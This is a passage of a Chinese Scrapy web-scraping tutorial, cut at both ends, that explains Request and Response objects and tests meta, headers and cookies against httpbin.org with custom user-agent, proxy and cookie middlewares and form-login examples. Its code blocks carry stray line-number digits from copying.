workLocation,publishTime\n\n            item['name'] = name.encode('utf-8')\n            item['detailLink'] = detailLink.encode('utf-8')\n            item['positionInfo'] = positionInfo.encode('utf-8')\n            item['peopleNumber'] = peopleNumber.encode('utf-8')\n            item['workLocation'] = workLocation.encode('utf-8')\n            item['publishTime'] = publishTime.encode('utf-8')\n\n            curpage = re.search('(\\d+)',response.url).group(1)\n            page = int(curpage) + 10\n            url = re.sub('\\d+', str(page), response.url)\n\n            # 发送新的url请求加入待爬队列，并调用回调函数 self.parse\n            yield scrapy.Request(url, callback = self.parse)\n\n            # 将获取的数据交给pipeline\n            yield item\n```\n\n- 编写pipeline.py文件\n\n```python\nimport json\n\n#class ItcastJsonPipeline(object):\nclass TencentJsonPipeline(object):\n\n    def __init__(self):\n        #self.file = open('teacher.json', 'wb')\n        self.file = open('tencent.json', 'wb')\n\n    def process_item(self, item, spider):\n        content = json.dumps(dict(item), ensure_ascii=False) + \"\\n\"\n        self.file.write(content)\n        return item\n\n    def close_spider(self, spider):\n        self.file.close()\n```\n\n- 在 setting.py 里设置ITEM_PIPELINES\n\n```python\nITEM_PIPELINES = {\n    #'mySpider.pipelines.SomePipeline': 300,\n    #\"mySpider.pipelines.ItcastJsonPipeline\":300\n    \"mySpider.pipelines.TencentJsonPipeline\":300\n}\n```\n\n- 执行爬虫：`scrapy crawl tencent`\n\n思考\n\n请思考 parse()方法的工作机制：\n\n```python\n1. 因为使用的yield，而不是return。parse函数将会被当做一个生成器使用。scrapy会逐一获取parse方法中生成的结果，并判断该结果是一个什么样的类型；\n2. 如果是request则加入爬取队列，如果是item类型则使用pipeline处理，其他类型则返回错误信息。\n3. scrapy取到第一部分的request不会立马就去发送这个request，只是把这个request放到队列里，然后接着从生成器里获取；\n4. 取尽第一部分的request，然后再获取第二部分的item，取到item了，就会放到对应的pipeline里处理；\n5. parse()方法作为回调函数(callback)赋值给了Request，指定parse()方法来处理这些请求 scrapy.Request(url, callback=self.parse)\n6. Request对象经过调度，执行生成 scrapy.http.response()的响应对象，并送回给parse()方法，直到调度器中没有Request（递归的思路）\n7. 取尽之后，parse()工作结束，引擎再根据队列和pipelines中的内容去执行相应的操作；\n8. 程序在取得各个页面的items前，会先处理完之前所有的request队列里的请求，然后再提取items。\n7. 这一切的一切，Scrapy引擎和调度器将负责到底。\n```\n\n## Request\n\nRequest 部分源码：\n\n```python\n# 部分代码\nclass Request(object_ref):\n\n    def __init__(self, url, callback=None, method='GET', headers=None, body=None, \n                 cookies=None, meta=None, encoding='utf-8', priority=0,\n                 dont_filter=False, errback=None):\n\n        self._encoding = encoding  # this one has to be set first\n        self.method = str(method).upper()\n        self._set_url(url)\n        self._set_body(body)\n        assert isinstance(priority, int), \"Request priority not an integer: %r\" % priority\n        self.priority = priority\n\n        assert callback or not errback, \"Cannot use errback without a callback\"\n        self.callback = callback\n        self.errback = errback\n\n        self.cookies = cookies or {}\n        self.headers = Headers(headers or {}, encoding=encoding)\n        self.dont_filter = dont_filter\n\n        self._meta = dict(meta) if meta else None\n\n    @property\n    def meta(self):\n        if self._meta is None:\n            self._meta = {}\n        return self._meta\n```\n\n其中，ff比较常用的参数：\n\n```python\nurl: 就是需要请求，并进行下一步处理的url\n\ncallback: 指定该请求返回的Response，由那个函数来处理。\n\nmethod: 请求一般不需要指定，默认GET方法，可设置为\"GET\", \"POST\", \"PUT\"等，且保证字符串大写\n\nheaders: 请求时，包含的头文件。一般不需要。内容一般如下：\n        # 自己写过爬虫的肯定知道\n        Host: media.readthedocs.org\n        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0\n        Accept: text/css,*/*;q=0.1\n        Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\n        Accept-Encoding: gzip, deflate\n        Referer: http://scrapy-chs.readthedocs.org/zh_CN/0.24/\n        Cookie: _ga=GA1.2.1612165614.1415584110;\n        Connection: keep-alive\n        If-Modified-Since: Mon, 25 Aug 2014 21:59:35 GMT\n        Cache-Control: max-age=0\n\nmeta: 比较常用，在不同的请求之间传递数据使用的。字典dict型\n\n        request_with_cookies = Request(\n            url=\"http://www.example.com\",\n            cookies={'currency': 'USD', 'country': 'UY'},\n            meta={'dont_merge_cookies': True}\n        )\n\nencoding: 使用默认的 'utf-8' 就行。\n\ndont_filter: 表明该请求不由调度器过滤。这是当你想使用多次执行相同的请求,忽略重复的过滤器。默认为False。\n\nerrback: 指定错误处理函数\n```\n\nRequest中中的meta使用案例：\n\n```python\n    def login(self, response):\n              post_data = {\n                 \"USERNAME\": ADMIN_LIST[yx],\n                 \"PASSWORD\": PASSWORD_LIST[yx],\n                 \"RANDOMCODE\": \"\"\n             }\n             yield scrapy.Request(captcha_url, meta={\"post_data\": post_data, \"yx\": yx}, callback=self.login_after_captcha)\n    def login_after_captcha(self, response):\n        post_data = response.meta.get(\"post_data\", {})\n        post_data[\"RANDOMCODE\"] = captcah_code\n        post_url = \"http://kdjw.hnust.edu.cn/kdjw/Logon.do?method=logon\"\n        yx = response.meta.get(\"yx\")\t\n```\n\n## Response\n\n```python\n# 部分代码\nclass Response(object_ref):\n    def __init__(self, url, status=200, headers=None, body='', flags=None, request=None):\n        self.headers = Headers(headers or {})\n        self.status = int(status)\n        self._set_body(body)\n        self._set_url(url)\n        self.request = request\n        self.flags = [] if flags is None else list(flags)\n\n    @property\n    def meta(self):\n        try:\n            return self.request.meta\n        except AttributeError:\n            raise AttributeError(\"Response.meta not available, this response \" \\\n                \"is not tied to any request\")\n```\n\n大部分参数和上面的差不多：\n\n```python\nstatus: 响应码\n_set_body(body)： 响应体\n_set_url(url)：响应url\nself.request = request\n```\n\nReponse对象的主要属性：\n\n1. meta：从其他请求传过来的et。属性，可以用来保持多个请求之间的数据连接。\n2. encoding：返回当前字符串编码和解码的格式。\n3. text：将返回来的数据作为unicode字符串返回。\n4. body：将返回来的数据作为bytes 字符串返回。\n5. xpath: xapth选择器。\n6. css: css选择器。\n\n### urljoin方法\n\nresponse.urljoin(该链接)就好了，urljoin用的是请求初始页得到的response作为base_url，拼接得到需要链接的完整url,如果你的链接本身就是完整的，该方法就不起作用，所以该方法通用的。\n\n```python\nurls = uibox.xpath(\".//ul/li/a/img/@src\").getall()\nurls1 = list(map(lambda x:response.urljoin(x),urls))\n```\n\n### css方法\n\n```python\n# 获取#SafeCodeImg 下的img标签的中的src属性值\ncaptcha_url = response.css(\"#SafeCodeImg img::attr('src')\").get()\n\n# 获取title标签的文本内容\nresponse.css('title::text').extract_first()\n```\n\n\n\n### 发送POST请求\n\n- 可以使用 `yield scrapy.FormRequest(url, formdata, callback)`方法发送POST请求。\n- 如果希望程序执行一开始就发送POST请求，可以重写Spider类的`start_requests(self)` 方法，并且不再调用start_urls里的url。并且去掉parse方法，因为爬虫启动的时候，会想start_urls发送get请求，然后回调parse方法\n\n```python\nclass mySpider(scrapy.Spider):\n    # start_urls = [\"http://www.example.com/\"]\n\n    def start_requests(self):\n        url = 'http://www.renren.com/PLogin.do'\n \n        # FormRequest 是Scrapy发送POST请求的方法\n        yield scrapy.FormRequest(\n            url = url,\n            formdata = {\"email\" : \"mr_mao_hacker@163.com\", \"password\" : \"axxxxxxxe\"},\n            callback = self.parse_page\n        )\n    def parse_page(self, response):\n        # do something\n```\n\n<font color=\"red\">注：如果使用Request或Response方式请求时，如果没有指定callback, 那么它会默认为callback为parse方法</font>\n\n## 请求参数meta、headers、cookies\n\n对于scrapy请参数，会经常用到，不过没有深究\n\n今天我就来探索下scrapy请求时所携带的3个重要参数`headers`, `cookies`, `meta`\n\n### 原生参数\n\n首先新建`myscrapy`项目，新建`my_spider`爬虫\n\n通过访问：http://httpbin.org/get 来测试请求参数\n\n将爬虫运行起来\n\n```python\n# -*- coding: utf-8 -*-\n\nfrom scrapy import Spider, Request\nimport logging\n\n\nclass MySpider(Spider):\n    name = 'my_spider'\n    allowed_domains = ['httpbin.org']\n    start_urls = [\n        'http://httpbin.org/get'\n    ]\n\n    def parse(self, response):\n        self.write_to_file(\"*\" * 40)\n        self.write_to_file(\"response text: %s\" % response.text)\n        self.write_to_file(\"response headers: %s\" % response.headers)\n        self.write_to_file(\"response meta: %s\" % response.meta)\n        self.write_to_file(\"request headers: %s\" % response.request.headers)\n        self.write_to_file(\"request cookies: %s\" % response.request.cookies)\n        self.write_to_file(\"request meta: %s\" % response.request.meta)\n\n    def write_to_file(self, words):\n        with open(\"logging.log\", \"a\") as f:\n            f.write(words)\n\n\nif __name__ == '__main__':\n    from scrapy import cmdline\n    cmdline.execute(\"scrapy crawl my_spider\".split())\n12345678910111213141516171819202122232425262728293031\n```\n\n保存到文件中的信息如下：\n\n```\nresponse text: \n{\n    \"args\":{},\n    \"headers\":{\n        \"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n        \"Accept-Encoding\":\"gzip,deflate\",\n        \"Accept-Language\":\"en\",\n        \"Connection\":\"close\",\n        \"Host\":\"httpbin.org\",\n        \"User-Agent\":\"Scrapy/1.5.1 (+https://scrapy.org)\"\n    },\n    \"origin\":\"223.72.90.254\",\n    \"url\":\"http://httpbin.org/get\"\n}\n\nresponse headers: \n{\n    b'Server': [b'gunicorn/19.8.1'], \n    b'Date': [b'Sun, 22 Jul 2018 10:03:15 GMT'], \n    b'Content-Type': [b'application/json'], \n    b'Access-Control-Allow-Origin': [b'*'], \n    b'Access-Control-Allow-Credentials': [b'true'], \n    b'Via': [b'1.1 vegur']\n}\n\nresponse meta: \n{\n    'download_timeout': 180.0, \n    'download_slot': 'httpbin.org', \n    'download_latency': 0.5500118732452393\n}\n\nrequest headers: \n{\n    b'Accept': [b'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'], b'Accept-Language': [b'en'], \n    b'User-Agent': [b'Scrapy/1.5.1 (+https://scrapy.org)'], \n    b'Accept-Encoding': [b'gzip,deflate']\n}\n\nrequest cookies: \n{}\n\nrequest meta: \n{\n    'download_timeout': 180.0, \n    'download_slot': 'httpbin.org', \n    'download_latency': 0.5500118732452393\n}123456789101112131415161718192021222324252627282930313233343536373839404142434445464748\n```\n\n### meta\n\n通过上面的输出比较，发现 response 和 request 的`meta`参数是一样的，meta的功能就是从request携带信息，将其传递给response的\n\n修改下代码，测试下传递效果\n\n```python\n# -*- coding: utf-8 -*-\n\nfrom scrapy import Spider, Request\nimport logging\n\n\nclass MySpider(Spider):\n    name = 'my_spider'\n    allowed_domains = ['httpbin.org']\n    start_urls = [\n        'http://httpbin.org/get'\n    ]\n\n    def start_requests(self):\n        for url in self.start_urls:\n            yield Request(url, meta={\"uid\": \"this is uid of meta\"})\n\n    def parse(self, response):\n        print(\"request meta: %s\" % response.request.meta.get(\"uid\"))\n        print(\"response meta: %s\" % response.meta.get(\"uid\"))1234567891011121314151617181920\n```\n\n输出如下\n\n```\nrequest meta: this is uid of meta\nresponse meta: this is uid of meta12\n```\n\n看来获取request中`meta`这两种方式都可行，这里的meta类似字典，可以按照字典获取key-value的形式获取对应的值\n当然代理设置也是通过meta的\n以下是一个代理中间件的示例\n\n```python\nimport random\n\n\nclass ProxyMiddleware(object):       \n    def process_request(self, request, spider):\n        proxy=random.choice(proxies)\n        request.meta[\"proxy\"] = proxy1234567\n```\n\n### headers\n\n按照如下路径，打开scrapy的`default_settings`文件\n\n```python\nfrom scrapy.settings import default_settings1\n```\n\n发现是这么写的\n\n```python\nUSER_AGENT = 'Scrapy/%s (+https://scrapy.org)' % import_module('scrapy').__version__\n\nDEFAULT_REQUEST_HEADERS = {\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en',\n}\n```\n\n修改下请求头，看服务器返回的信息\n\n```python\n# -*- coding: utf-8 -*-\n\nfrom scrapy import Spider, Request\nimport logging\n\n\nclass MySpider(Spider):\n    name = 'my_spider'\n    allowed_domains = ['httpbin.org']\n    start_urls = [\n        'http://httpbin.org/get',\n    ]\n\n    def start_requests(self):\n        for url in self.start_urls:\n            yield Request(url, headers={\"User-Agent\": \"Chrome\"})\n\n    def parse(self, response):\n        logging.debug(\"*\" * 40)\n        logging.debug(\"response text: %s\" % response.text)\n        logging.debug(\"response headers: %s\" % response.headers)\n        logging.debug(\"request headers: %s\" % response.request.headers)\n\n\nif __name__ == '__main__':\n    from scrapy import cmdline\n    cmdline.execute(\"scrapy crawl my_spider\".split())\n```\n\n输出如下\n\n```\nresponse text: \n{\n    \"args\":{},\n    \"headers\":\n    {\n        \"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n        \"Accept-Encoding\":\"gzip,deflate\",\n        \"Accept-Language\":\"en\",\n        \"Connection\":\"close\",\n        \"Host\":\"httpbin.org\",\n        \"User-Agent\":\"Chrome\"\n    },\n    \"origin\":\"122.71.64.121\",\n    \"url\":\"http://httpbin.org/get\"\n}\n\nresponse headers: \n{\n    b'Server': [b'gunicorn/19.8.1'], \n    b'Date': [b'Sun, 22 Jul 2018 10:29:26 GMT'], \n    b'Content-Type': [b'application/json'], \n    b'Access-Control-Allow-Origin': [b'*'], \n    b'Access-Control-Allow-Credentials': [b'true'], \n    b'Via': [b'1.1 vegur']\n}\n\n\nrequest headers: \n{\n    b'User-Agent': [b'Chrome'], \n    b'Accept': [b'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'], b'Accept-Language': [b'en'], \n    b'Accept-Encoding': [b'gzip,deflate']\n}\n```\n\n看到 request 和 服务器接收到并返回的的 headers（`User-Agent`）变化了，说明已经把默认的`User-Agent`修改了\n\n看到`default_settings`中默认使用了中间件`UserAgentMiddleware`\n\n```\n'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware': 500,1\n```\n\n源码如下\n\n```python\nclass UserAgentMiddleware(object):\n    \"\"\"This middleware allows spiders to override the user_agent\"\"\"\n\n    def __init__(self, user_agent='Scrapy'):\n        self.user_agent = user_agent\n\n    @classmethod\n    def from_crawler(cls, crawler):\n        o = cls(crawler.settings['USER_AGENT'])\n        crawler.signals.connect(o.spider_opened, signal=signals.spider_opened)\n        return o\n\n    def spider_opened(self, spider):\n        self.user_agent = getattr(spider, 'user_agent', self.user_agent)\n\n    def process_request(self, request, spider):\n        if self.user_agent:\n            request.headers.setdefault(b'User-Agent', self.user_agent)\n```\n\n仔细阅读源码，发现无非就是对`User-Agent`读取和设置操作，仿照源码写自己的中间件\n\n这里使用`fake_useragent`库来随机获取请求头，详情可参看：\nhttps://blog.csdn.net/mouday/article/details/80476409\n\nmiddlewares.py 编写自己的中间件\n\n```python\nfrom fake_useragent import UserAgent\n\n\nclass UserAgentMiddleware(object):\n    def process_request(self, request, spider):\n        ua = UserAgent()\n        user_agent = ua.chrome\n        request.headers.setdefault(b'User-Agent', user_agent)12345678\n```\n\nsettings.py 用自己的中间件替换默认中间件\n\n```python\nDOWNLOADER_MIDDLEWARES = {\n    'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware': None,\n    'myscrapy.middlewares.UserAgentMiddleware': 500\n}1234\n```\n\n输出如下：\n\n```\nrequest headers: \n{\n    b'Accept': [b'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'], b'Accept-Language': [b'en'], \n    b'User-Agent': [b'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36'], \n    b'Accept-Encoding': [b'gzip,deflate']\n}123456\n```\n\n关于scrapy请求头设置，可以参考我之前的文章：\nhttps://blog.csdn.net/mouday/article/details/80776030\n\n### cookies\n\n上面的信息中少了个`response.cookies`，如果添加上回报错：\n\n```\nAttributeError: 'TextResponse' object has no attribute 'cookies'1\n```\n\n说明响应是不带cookies参数的\n\n通过 http://httpbin.org/cookies 测试cookies\n\n```python\n# -*- coding: utf-8 -*-\n\nfrom scrapy import Spider, Request\nimport logging\n\n\nclass MySpider(Spider):\n    name = 'my_spider'\n    allowed_domains = ['httpbin.org']\n    start_urls = [\n        'http://httpbin.org/cookies'\n    ]\n\n\n    def start_requests(self):\n        for url in self.start_urls:\n            yield Request(url, cookies={\"username\": \"pengshiyu\"})\n\n    def parse(self, response):\n        logging.debug(\"*\" * 40)\n        logging.debug(\"response text: %s\" % response.text)\n        logging.debug(\"request headers: %s\" % response.request.headers)\n        logging.debug(\"request cookies: %s\" % response.request.cookies)\n\n\nif __name__ == '__main__':\n    from scrapy import cmdline\n    cmdline.execute(\"scrapy crawl my_spider\".split())\n```\n\n返回值如下：\n\n```\nresponse text: \n{\n    \"cookies\":\n        {\n        \"username\":\"pengshiyu\"\n        }\n}\n\nrequest headers: \n{\n    b'Accept': [b'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'], b'Accept-Language': [b'en'], \n    b'User-Agent': [b'Scrapy/1.5.1 (+https://scrapy.org)'], \n    b'Accept-Encoding': [b'gzip,deflate'], \n    b'Cookie': [b'username=pengshiyu']\n}\n\nrequest cookies: \n{\n    'username': 'pengshiyu'\n}1234567891011121314151617181920\n```\n\n服务器端已经接收到我的cookie值了，不过request的`headers`也包含了相同的cookie，保存到了键为`Cookie`下面\n\n其实并没有什么cookie，浏览器请求的·cookies·被包装到了·headers·中发送给服务器端\n既然这样，在headers中包含`Cookie`试试\n\n```python\n def start_requests(self):\n        for url in self.start_urls:\n            yield Request(url, headers={\"Cookie\": {\"username\": \"pengshiyu\"}})123\n```\n\n返回结果\n\n```\nresponse text: \n{\n    \"cookies\":{}\n}\n\nrequest headers: \n{\n    b'Accept': [b'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'], b'Accept-Language': [b'en'], \n    b'User-Agent': [b'Scrapy/1.5.1 (+https://scrapy.org)'], \n    b'Accept-Encoding': [b'gzip,deflate']\n}\n\n\nrequest cookies: \n{}\n```\n\ncookies 是空的，设置失败\n\n我们找到 `default_settings` 中的cookie中间件\n\n```python\n'scrapy.downloadermiddlewares.cookies.CookiesMiddleware': 7001\nclass CookiesMiddleware(object):\n    \"\"\"This middleware enables working with sites that need cookies\"\"\"\n\n    def __init__(self, debug=False):\n        self.jars = defaultdict(CookieJar)\n        self.debug = debug\n\n    @classmethod\n    def from_crawler(cls, crawler):\n        if not crawler.settings.getbool('COOKIES_ENABLED'):\n            raise NotConfigured\n        return cls(crawler.settings.getbool('COOKIES_DEBUG'))\n\n    def process_request(self, request, spider):\n        if request.meta.get('dont_merge_cookies', False):\n            return\n\n        cookiejarkey = request.meta.get(\"cookiejar\")\n        jar = self.jars[cookiejarkey]\n        cookies = self._get_request_cookies(jar, request)\n        for cookie in cookies:\n            jar.set_cookie_if_ok(cookie, request)\n\n        # set Cookie header\n        request.headers.pop('Cookie', None)\n        jar.add_cookie_header(request)\n        self._debug_cookie(request, spider)\n\n    def process_response(self, request, response, spider):\n        if request.meta.get('dont_merge_cookies', False):\n            return response\n\n        # extract cookies from Set-Cookie and drop invalid/expired cookies\n        cookiejarkey = request.meta.get(\"cookiejar\")\n        jar = self.jars[cookiejarkey]\n        jar.extract_cookies(response, request)\n        self._debug_set_cookie(response, spider)\n\n        return response\n\n    def _debug_cookie(self, request, spider):\n        if self.debug:\n            cl = [to_native_str(c, errors='replace')\n                  for c in request.headers.getlist('Cookie')]\n            if cl:\n                cookies = \"\\n\".join(\"Cookie: {}\\n\".format(c) for c in cl)\n                msg = \"Sending cookies to: {}\\n{}\".format(request, cookies)\n                logger.debug(msg, extra={'spider': spider})\n\n    def _debug_set_cookie(self, response, spider):\n        if self.debug:\n            cl = [to_native_str(c, errors='replace')\n                  for c in response.headers.getlist('Set-Cookie')]\n            if cl:\n                cookies = \"\\n\".join(\"Set-Cookie: {}\\n\".format(c) for c in cl)\n                msg = \"Received cookies from: {}\\n{}\".format(response, cookies)\n                logger.debug(msg, extra={'spider': spider})\n\n    def _format_cookie(self, cookie):\n        # build cookie string\n        cookie_str = '%s=%s' % (cookie['name'], cookie['value'])\n\n        if cookie.get('path', None):\n            cookie_str += '; Path=%s' % cookie['path']\n        if cookie.get('domain', None):\n            cookie_str += '; Domain=%s' % cookie['domain']\n\n        return cookie_str\n\n    def _get_request_cookies(self, jar, request):\n        if isinstance(request.cookies, dict):\n            cookie_list = [{'name': k, 'value': v} for k, v in \\\n                    six.iteritems(request.cookies)]\n        else:\n            cookie_list = request.cookies\n\n        cookies = [self._format_cookie(x) for x in cookie_list]\n        headers = {'Set-Cookie': cookies}\n        response = Response(request.url, headers=headers)\n\n        return jar.make_cookies(response, request)\n```\n\n观察源码，发现以下几个方法\n\n```python\n# process_request\njar.add_cookie_header(request)   # 添加cookie到headers\n\n# process_response\njar.extract_cookies(response, request)  # 提取出cookie\n\n# _debug_cookie \nrequest.headers.getlist('Cookie')  # 从headers获取cookie\n\n# _debug_set_cookie\nresponse.headers.getlist('Set-Cookie')  # 从headers获取Set-Cookie1234567891011\n```\n\n几个参数：\n\n```python\n# settings\nCOOKIES_ENABLED\nCOOKIES_DEBUG\n\n# meta\ndont_merge_cookies\ncookiejar\n\n# headers\nCookie\nSet-Cookie1234567891011\n```\n\n使用最开始cookie部分的代码，为了看的清晰，我删除了headers中其他参数，下面逐个做测试\n\n1、COOKIES_ENABLED\n\nCOOKIES_ENABLED = True (默认)\n\n```\nresponse text: \n{\n    \"cookies\":{\"username\":\"pengshiyu\"}\n}\n\nrequest headers: \n{\n    b'Cookie': [b'username=pengshiyu']\n}\n\nrequest cookies: \n{\n    'username': 'pengshiyu'\n}\n```\n\n一切ok\nCOOKIES_ENABLED = False\n\n```\nresponse text: \n{\n    \"cookies\":{}\n}\n\nrequest headers: \n{}\n\nrequest cookies: \n{\n    'username': 'pengshiyu'\n}\n```\n\n虽然request的cookies有内容，不过headers没有加进去，所以服务器端没有获取到cookie\n\n`注意`：查看请求的真正cookie，应该在request的header中查看\n\n2、COOKIES_DEBUG\nCOOKIES_DEBUG = False (默认)\n\n```\nDEBUG: Crawled (200) <GET http://httpbin.org/cookies> (referer: None)1\n```\n\nCOOKIES_DEBUG = True\n多输出了下面一句，可以看到我设置的cookie\n\n```\n[scrapy.downloadermiddlewares.cookies] DEBUG: Sending cookies to: <GET http://httpbin.org/cookies>\nCookie: username=pengshiyu12\n```\n\n当然，debug模式下服务器肯定能正常接收我的cookie\n\n3、dont_merge_cookies\n设置`meta={\"dont_merge_cookies\": True}` 默认为 False\n\n```\nresponse text: \n{\n    \"cookies\":{}\n}\n\nrequest headers: \n{}\n\nrequest cookies: \n{\n    'username': 'pengshiyu'\n}\n```\n\n服务器并没有接收到我的cookie\n\n4、cookiejar\n直接通过`response.request.meta.get(\"cookiejar\")`获取\n\n```\nresponse text: \n{\"cookies\":{\"username\":\"pengshiyu\"}}\n\nrequest headers: \n{b'Cookie': [b'username=pengshiyu']}\n\nrequest cookies: \n{'username': 'pengshiyu'}\n\nrequest cookiejar: \nNone\n```\n\n啥也没有\n\n5、Cookie\n直接获取：`response.request.headers.get(\"Cookie\"))`\n\n```\nheaders Cookie: \nb'username=pengshiyu'\n```\n\n看来这里已经被处理成字节串了\n\n修改Request请求参数\n`cookies={\"username\": \"pengshiyu\", \"password\": \"123456\"}`\n\n```python\n# response.request.headers.get(\"Cookie\"))\nheaders Cookie: \nb'username=pengshiyu; password=123456'\n\n# request.headers.getlist('Cookie')\nheaders Cookies: \n[b'username=pengshiyu; password=123456']1234567\n```\n\n很明显，两个获取方式，一个获取的是字符串，一个获取的是列表\n\n6、Set-Cookie\n\n同样，我通过以下\n\n```python\nresponse.headers.get(\"Set-Cookie\")\nresponse.headers.getlist(\"Set-Cookie\")\n```\n\n还是啥都没有\n\n```\nheaders Set-Cookie: None\nheaders Set-Cookies: []\n```\n\n不过，到目前为止，cookie设置的大概流程应该如下：\n\n```python\nrequest cookies: {'username': 'pengshiyu', 'password': '123456'}\nrequest cookiejar: None\nrequest Cookie: b'username=pengshiyu; password=123456'\nresponse text: {\"cookies\":{\"password\":\"123456\",\"username\":\"pengshiyu\"}}\nresponse Set-Cookie: None\nresponse Set-Cookies: []\n```\n\n7、接收服务器传递过来的cookie\n\n将请求链接改为 ：’http://httpbin.org/cookies/set/key/value’\n开启 COOKIES_DEBUG\n在debug中看到如下变化\n\n```\nSending cookies to: <GET http://httpbin.org/cookies/set/key/value>\nCookie: username=pengshiyu; password=123456\n\nReceived cookies from: <302 http://httpbin.org/cookies/set/key/value>\nSet-Cookie: key=value; Path=/\n\nRedirecting (302) to <GET http://httpbin.org/cookies> from <GET http://httpbin.org/cookies/set/key/value>\n\nSending cookies to: <GET http://httpbin.org/cookies>\nCookie: key=value; username=pengshiyu; password=12345612345678910\n```\n\n日志看出他进行了两次请求，看到中间的cookie变化：\n\n```\n发送 -> 接收 -> 发送\n```\n\n第二次发送的cookie包含了第一次请求时服务器端传递过来的cookie，说明scrapy对服务器端和客户端的cookie进行了管理\n\n最后的cookie输出\n\n```\nrequest cookies: {'username': 'pengshiyu', 'password': '123456'}\nrequest cookiejar: None\nrequest Cookie: b'key=value; username=pengshiyu; password=123456'\nresponse text: {\"cookies\":{\"key\":\"value\",\"password\":\"123456\",\"username\":\"pengshiyu\"}}\nresponse Set-Cookie: None12345\n```\n\nrequest的cookies并没有变化，而request.headers.get(“Cookie”)已经发生了变化\n\n8、接收服务器传递过来的 同key键cookie\n将请求链接换为：httpbin.org/cookies/set/username/pengpeng\n\n```\nSending cookies to: <GET http://httpbin.org/cookies/set/username/pengpeng>\nCookie: username=pengshiyu\n\nReceived cookies from: <302 http://httpbin.org/cookies/set/username/pengpeng>\nSet-Cookie: username=pengpeng; Path=/\n\nRedirecting (302) to <GET http://httpbin.org/cookies> from <GET http://httpbin.org/cookies/set/username/pengpeng>\n\nSending cookies to: <GET http://httpbin.org/cookies>\nCookie: username=pengshiyu12345678910\n```\n\n发现虽然收到了`username=pengpeng`但是，第二次发请求的时候，又发送了原来的的cookie`username=pengshiyu`\n\n这说明客户端设置的cookie优先级高于服务器端传递过来的cookie\n\n9、取消使用中间件CookiesMiddleware\n\n```\nDOWNLOADER_MIDDLEWARES = {\n    'scrapy.downloadermiddlewares.cookies.CookiesMiddleware': None\n}123\n```\n\n请求链接：http://httpbin.org/cookies\n\n```\nrequest cookies: {'username': 'pengshiyu'}\nrequest cookiejar: None\nrequest Cookie: None\nresponse text: {\"cookies\":{}}\nresponse Set-Cookie: None\nresponse Set-Cookies: []123456\n```\n\n这个效果类似`COOKIES_ENABLED = False`\n\n10、自定义cookie池\n\n```\nclass RandomCookiesMiddleware(object):\n    def process_request(self, request, spider):\n        cookies = []\n        cookie = random.choice(cookies)\n        request.cookies = cookie\n123456\n```\n\n同样需要设置\n\n```\nDOWNLOADER_MIDDLEWARES = {\n    'myscrapy.middlewares.RandomCookiesMiddleware': 600\n}123\n```\n\n注意到scrapy的中间件`CookiesMiddleware`值是700,为了cookie设置生效，需要在这个中间件启用之前就设置好自定义的cookie，优先级按照从小到大的顺序执行，所以我们自己自定义的cookie中间件需要小于 `< 700`\n\n```\n'scrapy.downloadermiddlewares.cookies.CookiesMiddleware': 700,1\n```\n\n### 总结\n\n| 参数    | 设置                                                                                                      | 获取                                                                                               | 说明                                                           |\n| ------- | --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------- |\n| meta    | Request(url, meta={“uid”: “100”}) request.meta[“uid”] = “100”                                             | response.request.meta.get(“uid”) response.meta.get(“uid”)                                          | 携带request参数给response,或设置代理                           |\n| headers | Request(url, headers={“User-Agent”: “chrome”}) request.headers[“User-Agent”]=”chrome” USER_AGENT=”chrome” | response.request.headers.get(“User-Agent”)                                                         | 设置客户端请求头参数                                           |\n| cookies | Request(url, cookies={“username”: “pengshiyu”} ) request.cookies = {“username”: “pengshiyu”}              | response.request.cookies response.request.headers.get(“Cookie”) response.headers.get(‘Set-Cookie’) | 客户端请求头中的Cookie参数，管理客户端与服务器端之间的会话识别 |\n\n常用的中间件如下\n\n```python\nimport random\nfrom fake_useragent import UserAgent\n\n\nclass RandomUserAgentMiddleware(object):\n    def process_request(self, request, spider):\n        ua = UserAgent()\n        user_agent = ua.chrome\n        request.headers.setdefault(b'User-Agent', user_agent)\n\n\nclass RandomProxyMiddleware(object):\n    def process_request(self, request, spider):\n        proxies = []\n        proxy = random.choice(proxies)\n        request.meta[\"proxy\"] = proxy\n\n\nclass RandomCookiesMiddleware(object):\n    def process_request(self, request, spider):\n        cookies = []\n        cookie = random.choice(cookies)\n        request.cookies = cookie\n```\n\n当然，cookies 和 proxies 需要结合自己的情况补全\n\n### 模拟登陆\n\n使用FormRequest.from_response()方法[模拟用户登录](http://docs.pythontab.com/scrapy/scrapy0.24/topics/request-response.html#topics-request-response-ref-request-userlogin)\n\n> 通常网站通过 实现对某些表单字段（如数据或是登录界面中的认证令牌等）的预填充。\n>\n> 使用Scrapy抓取网页时，如果想要预填充或重写像用户名、用户密码这些表单字段， 可以使用 FormRequest.from_response() 方法实现。\n>\n> 下面是使用这种方法的爬虫例子:\n\n```python\nimport scrapy\n\nclass LoginSpider(scrapy.Spider):\n    name = 'example.com'\n    start_urls = ['http://www.example.com/users/login.php']\n\n    def parse(self, response):\n        return scrapy.FormRequest.from_response(\n            response,\n            formdata={'username': 'john', 'password': 'secret'},\n            callback=self.after_login\n        )\n\n    def after_login(self, response):\n        # check login succeed before going on\n        if \"authentication failed\" in response.body:\n            self.log(\"Login failed\", level=log.ERROR)\n            return\n\n        # continue scraping with authenticated session...\n```\n\n## 知乎爬虫案例\n\nzhihuSpider.py爬虫代码\n\n```python\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\nfrom scrapy.spiders import CrawlSpider, Rule\nfrom scrapy.selector import Selector\nfrom 